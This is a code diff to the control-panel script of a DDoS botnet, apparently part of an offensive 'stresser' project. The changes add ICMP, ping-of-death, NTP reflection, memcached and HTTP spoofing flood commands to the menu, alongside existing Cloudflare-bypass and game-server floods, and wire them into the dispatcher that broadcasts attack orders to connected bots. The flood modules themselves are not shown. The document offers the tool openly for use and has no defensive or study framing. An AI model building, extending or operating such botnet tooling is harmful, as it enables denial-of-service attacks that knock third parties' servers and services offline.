@@ -1,21 +1,28 @@
 #!/usr/bin/env python3
-#-*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 
 # Tools
 from src.Commands.Tools.url_to_ip import url_to_ip
 from src.Commands.Tools.ip_to_loc import ip_to_loc
 
+# Layer 3
+from src.Commands.Methods_L3.icmp import icmp
+from src.Commands.Methods_L3.pod import pod
+
 # Layer 4
 from src.Commands.Methods_L4.junk import junk
 from src.Commands.Methods_L4.tcp import tcp
+from src.Commands.Methods_L4.ntp import ntp
+from src.Commands.Methods_L4.mem import mem
 from src.Commands.Methods_L4.udp import udp
 from src.Commands.Methods_L4.hex import hex
 from src.Commands.Methods_L4.tup import tup
 from src.Commands.Methods_L4.ack import ack
 
 # Layer 7
+from src.Commands.Methods_L7.httpio import httpio
+from src.Commands.Methods_L7.httpspoof import httpspoof
 from src.Commands.Methods_L7.httpstorm import httpstorm
-from src.Commands.Methods_L7.iostresser import iostresser
 from src.Commands.Methods_L7.httpcfb import httpcfb
 from src.Commands.Methods_L7.httpget import httpget
 
@@ -53,52 +60,33 @@ def text2Gen():
     colored_word = ""
 
     for i, letter in enumerate(word):
-
         color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
-
-
         colored_word += f"{color_code}{letter}{reset_color}"
-
-
         current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)
 
     return colored_word
 
 def color(data_input_output):
-    random_output = data_input_output
-    if random_output == "GREEN":
-        data = '\033[32m'
-    elif random_output == "LIGHTGREEN_EX":
-        data = '\033[92m'
-    elif random_output == "YELLOW":
-        data = '\033[33m'
-    elif random_output == "LIGHTYELLOW_EX":
-        data = '\033[93m'
-    elif random_output == "CYAN":
-        data = '\033[36m'
-    elif random_output == "LIGHTCYAN_EX":
-        data = '\033[96m'
-    elif random_output == "BLUE":
-        data = '\033[34m'
-    elif random_output == "LIGHTBLUE_EX":
-        data = '\033[94m'
-    elif random_output == "MAGENTA":
-        data = '\033[35m'
-    elif random_output == "LIGHTMAGENTA_EX":
-        data = '\033[95m'
-    elif random_output == "RED":
-        data = '\033[31m'
-    elif random_output == "LIGHTRED_EX":
-        data = '\033[91m'
-    elif random_output == "BLACK":
-        data = '\033[30m'
-    elif random_output == "LIGHTBLACK_EX":
-        data = '\033[90m'
-    elif random_output == "WHITE":
-        data = '\033[37m'
-    elif random_output == "LIGHTWHITE_EX":
-        data = '\033[97m'
-    return data
+    color_codes = {
+        "GREEN": '\033[32m',
+        "LIGHTGREEN_EX": '\033[92m',
+        "YELLOW": '\033[33m',
+        "LIGHTYELLOW_EX": '\033[93m',
+        "CYAN": '\033[36m',
+        "LIGHTCYAN_EX": '\033[96m',
+        "BLUE": '\033[34m',
+        "LIGHTBLUE_EX": '\033[94m',
+        "MAGENTA": '\033[35m',
+        "LIGHTMAGENTA_EX": '\033[95m',
+        "RED": '\033[31m',
+        "LIGHTRED_EX": '\033[91m',
+        "BLACK": '\033[30m',
+        "LIGHTBLACK_EX": '\033[90m',
+        "WHITE": '\033[37m',
+        "LIGHTWHITE_EX": '\033[97m',
+    }
+
+    return color_codes.get(data_input_output, "")
 
 lightwhite = color("LIGHTWHITE_EX")
 gray = color("LIGHTBLACK_EX")
@@ -119,22 +107,36 @@ help = f"""
 {lightwhite}EXIT         {gray}Disconnects from the net
 """
 
-botnetMethods = f"""
-{gray}L4 Methods:
+Methods_L3 = f"""{gray}L3 Methods:
+{lightwhite}.ICMP              {gray}Flood ICMP Request
+{lightwhite}.POD               {gray}Ping Of Death OLD Method Of DDoS"""
+
+Methods_L4 = f"""{gray}L4 Methods:
+{lightwhite}.NTP               {gray}NTP Reflection flood
+{lightwhite}.MEM               {gray}Memcached Flood 
 {lightwhite}.UDP               {gray}UDP Flood  
 {lightwhite}.TCP               {gray}TCP Flood             
 {lightwhite}.TUP               {gray}TCP and UDP Flood
 {lightwhite}.ACK               {gray}TCP ACK flood
 {lightwhite}.HEX               {gray}HEX Flood
-{lightwhite}.JUNK              {gray}Junk flood
-{gray}L7 Methods:
+{lightwhite}.JUNK              {gray}Junk flood"""
+
+Methods_L7 = f"""{gray}L7 Methods:
+{lightwhite}.HTTPIO            {gray}HTTP IO Stresser
 {lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass attack      
 {lightwhite}.HTTPGET           {gray}HTTP GET requests attack
-{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests
-{lightwhite}.IOSTRESSER        {gray}HTTP STORM Connections
-{gray}Games Methods: 
+{lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
+{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests"""
+
+GameMethods = f"""{gray}Games Methods: 
 {lightwhite}.VSE               {gray}Valve Source Engine query flood         
-{lightwhite}.ROBLOX            {gray}Roblox UDP Flood
+{lightwhite}.ROBLOX            {gray}Roblox UDP Flood"""
+
+botnetMethods = f"""
+{Methods_L3}
+{Methods_L4}
+{Methods_L7}
+{GameMethods}
 """
 
 tools = f"""
@@ -404,6 +406,18 @@ def command_line(client, username):
             elif command == '.HEX': # Specific HEXIDECIMAL Flood
                 hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
 
+            elif command == '.NTP': # NTP Reflection Attack
+                ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+
+            elif command == '.MEM': # Memcached Flood
+                mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+
+            elif command == '.ICMP': # Flood ICMP Request
+                icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)
+
+            elif command == '.POD': # Ping of death
+                pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)
+
             elif command == '.ROBLOX': # Roblox flood
                 roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
 
@@ -416,8 +430,11 @@ def command_line(client, username):
             elif command == '.HTTPSTORM': # HTTP request attack
                 httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.IOSTRESSER': # FULL POWER !!!
-                iostresser(args, validate_time, send, client, ansi_clear, broadcast, data)
+            elif command == '.HTTPIO': # FULL POWER !!!
+                httpio(args, validate_time, send, client, ansi_clear, broadcast, data)
+
+            elif command == '.HTTPSPOOF': # HTTP GET SPOOF
+                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)
 
             elif command == '.HTTPGET': # HTTP request attack
                 httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
@@ -508,7 +525,7 @@ def reg_main():
     threading.Thread(target=register, args=[*sock.accept(), send]).start()
 
 def main():
-    with open("src/config.json") as jsonFile:
+    with open("src/config.json", encoding="utf-8") as jsonFile:
         jsonObject = json.load(jsonFile)
         jsonFile.close()
 
@@ -544,5 +561,5 @@ def main():
 def start():
     try:
         main()
-    except:
-        print("Error, skipping..")
+    except Exception as e:
+        print(f"Error, skipping.  {e}")
